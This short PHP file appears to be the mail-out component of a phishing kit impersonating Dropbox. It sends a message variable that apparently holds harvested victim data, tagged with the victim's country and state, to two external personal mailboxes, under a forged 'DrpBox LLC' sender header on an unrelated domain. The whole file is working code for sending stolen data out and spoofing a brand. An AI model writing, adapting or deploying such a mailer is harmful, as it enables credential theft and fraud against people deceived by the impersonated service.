<?php

$to = "fletcher7924@gmail.com,fletcher7924@yandex.com";
$subject = "DrpBox $country | $state";
$from = "From: DrpBox LLC<andyida@pestcontrols.com>";

mail($to,$subject,$msg,$from);

?>